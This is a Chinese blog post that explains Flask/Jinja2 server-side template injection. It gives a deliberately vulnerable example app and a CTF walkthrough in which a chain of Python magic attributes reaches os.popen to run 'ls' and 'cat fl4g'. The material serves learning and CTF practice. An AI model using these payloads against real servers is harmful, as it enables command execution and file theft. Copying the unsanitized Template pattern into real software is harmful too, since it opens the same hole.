ssti模板注入漏洞

ssti模板注入 flask框架
Markdown
发布日期:   2020-09-11

在做题的时候遇到了ssti注入，本来不是很想去学习这个漏洞，因为flask框架是python的，然后我自己python又很辣鸡，最后还是逼了自己去看哈哈哈哈，这里就简单总结一下几位大佬的讲解。

ssti漏洞成因

ssti模板注入，实际还是一种注入，漏洞的形成还是由于信任用户的输入以及代码不规范过滤不严。

我们从一个例子来看：

from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()

这里获取用户get传参进来的name参数，将name参数直接传给Template对象进行拼接显示在页面上，并没有对用户的输入进行过滤，随后使用render()进行渲染，render()方法会对用户的输入进行解析，从而导致了ssti注入。

漏洞的利用

这里给出几个会用到的魔术方法

__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__   返回该对象所继承的基类
__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用

_class_

返回类型所属的对象，就是返回当前数据实例化的类是什么，举几个例子：

_bases__及__mro_\

两者类似，都是获得该类的基类，例子如下：

不同的是，__mro__会将本类包含，而___bases__不会将本类包含进去

_subclasses_()

查看类中所有存活子类的引用，也就是返回这个类的子类的集合，也就是object类的子类的集合。这里顺便说一下，python2返回的子类和python3是不同的，但python2有的python3也基本都有。

xctf_web_python_template_injection

这里就用攻防世界的一个题来作为例子分析一下

测试是否存在ssti漏洞

根据题目猜测是一个ssti模板注入漏洞，经过测试发现输入的7*7被执行了，确实存在ssti注入漏洞。

查看类型对象

接着__class__查看返回的类型的对象

''.__class__

获取object基类

这里我用的是__mro__这个魔术方法

‘’.__class__.__mro__

我们可以看到我们要查找的object类对应的索引是2，那么对应的payload就应该是

‘’.__class__.__mro__[2]

获取基类的所有子类

‘’.__class__.__mro__[2].__subclasses__()

这部分是去寻找一个可以执行命令或者读取文件的类，_subclasses_()返回该类的所有子类。

我们现在就是要去寻找可以执行命令或者读取文件的类，由于类的数量太多，可以考虑使用脚本来进行判断。这里找的是site._Printer类，是第72个类(所以索引应该是71)

查看读取文件

‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()

我们可以利用.__init__.__globals__来查找os类下的，__init__初始化类，__globals__全局查找所有的方法、变量、参数。

在我们全局查找所有的方法时，找到一个可以利用的function popen（这里我利用的是os模块中的popen执行ls来打印所有文件，还有其他很多方法来读取文件，详情可以自行百度）

发现我们要找的flag文件

将ls命令换成cat命令，即可读取到文件内容

‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()

该题还有其他的payload，原理都一样。
